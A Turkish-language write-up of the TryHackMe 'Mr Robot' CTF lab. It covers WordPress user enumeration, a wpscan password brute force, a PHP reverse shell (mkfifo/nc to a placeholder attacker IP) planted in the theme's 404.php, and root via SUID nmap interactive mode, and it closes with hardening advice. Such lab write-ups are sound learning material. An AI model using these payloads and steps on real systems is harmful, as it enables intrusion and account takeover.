# TryHackMe: Mr Robot CTF — İlk Medium ve WordPress ile Root

Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine benim ilk medium zorlukta CTF'im. Mr. Robot dizisi temalı bir makine, aslında gerçek dünyada karşınıza çıkabilecek bir WordPress pentest senaryosunu baştan sona yaşatıyor.

## Keşif

IP elimize geçtiği an her zamanki gibi Nmap ile tarama yaptım. 3 port açık çıktı: 22 (SSH), 80 (HTTP) ve 443 (HTTPS). İkisi de Apache çalıştırıyor. Tarayıcıdan 80 portuna girdiğimde Mr. Robot dizisinden ilham almış bir terminal arayüzü karşıladı beni, ama asıl önemli olan altta yatan WordPress sitesiydi.

## robots.txt ile İlk Flag ve Wordlist

Her web pentest'te kontrol etmemiz gereken dosyalardan biri robots.txt. Baktığımda iki dosya listelenmişti: `key-1-of-3.txt` ve `fsocity.dic`. İlk dosya doğrudan birinci flag'i verdi. İkincisi ise devasa bir wordlist çıktı, 858 bin satır. Bu haliyle brute force saatler sürerdi. Aklıma tekrar eden satırları temizlemek geldi:

```
sort fsocity.dic | uniq > fsocity-clean.dic
```

858 bin satır 11 bine düştü. Neredeyse tamamı tekrardı. Bu basit bir komut ama brute force süresini saatlerden dakikalara indirdi.

## WordPress'e Giriş Yolu

Sitenin WordPress olduğunu fark ettiğimde `/wp-login.php` denedim ve login sayfası karşıma çıktı. Şimdi soru şu: kullanıcı adı ne? Dizi temalı olduğu için `Elliot` denedim, rastgele bir şifre yazdım. Burada WordPress'in ilginç bir güvenlik açığı var: yanlış kullanıcı girdiğinizde "Invalid username" diyor, ama doğru kullanıcıya yanlış şifre girdiğinizde "The password you entered for the username Elliot is incorrect" diyor. Mesaj değişti, yani Elliot geçerli bir kullanıcı.

Bir geliştirici olarak bu beni şaşırttı. Login formlarında genel bir hata mesajı vermek bu tür enumerate saldırılarını engellerdi.

## Brute Force

Elimde kullanıcı adı ve temizlenmiş wordlist var. WordPress brute force için wpscan kullandım:

```
wpscan --url http://HEDEF_IP --usernames Elliot --passwords fsocity-clean.dic
```

37 saniyede şifre bulundu: ER28-0652. Diziden Elliot'ın çalışan numarası.

## Shell Alma

WordPress admin paneline girdikten sonra Appearance altındaki Editor'ü buldum. Burada tema dosyalarını, yani PHP dosyalarını düzenleyebiliyorsunuz. 404.php dosyasını seçtim çünkü siteyi bozmaz ve olmayan bir URL'e gittiğinizde tetiklenir.

İlk denemem olan exec() fonksiyonu çalışmadı. system() ile denediğimde reverse shell geldi:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc SALDIRGAN_IP 4444 >/tmp/f"); ?>
```

Kali tarafında `nc -lvnp 4444` ile listener açtım, tarayıcıdan var olmayan bir sayfaya gittim ve shell geldi. Artık makinenin içindeydim, daemon kullanıcısı olarak.

WordPress'te `wp-config.php` dosyasına `define('DISALLOW_FILE_EDIT', true);` eklemek bu editörü tamamen kapatır. Production ortamında kesinlikle yapılması gereken bir şey.

## Root'a Yükselme

Shell aldıktan sonra her zaman yaptığım kontrol sırasını izledim. `sudo -l` denedim ama daemon'un şifresi yoktu. SUID taraması yaptım ve listede `/usr/local/bin/nmap` çıktı. Normal bir sistemde nmap'in SUID olması beklenmez, bu bir yanlış yapılandırma.

Eski nmap versiyonlarında interactive mod var. Bu modda sistem komutu çalıştırabiliyorsunuz:

```
nmap --interactive
!sh
```

Root shell geldi. `/home/robot/` altında ikinci flag'i, `/root/` altında üçüncü flag'i buldum. Makine tamamen ele geçirildi.

## Geliştirici Gözünden

Bu makinede gördüğüm her zafiyet aslında basit önlemlerle engellenebilirdi. WordPress'in login mesajları genel yapılsaydı kullanıcı enumerate edilemezdi. Rate limiting veya fail2ban olsaydı brute force çalışmazdı. Theme editor kapalı olsaydı shell alınamazdı. Ve en önemlisi, nmap gibi bir araca SUID verilmeseydi root'a yükselinemezdi. Bir yazılımcı olarak bu tür yanlış yapılandırmaların ne kadar tehlikeli olduğunu görmek çok öğretici oldu.
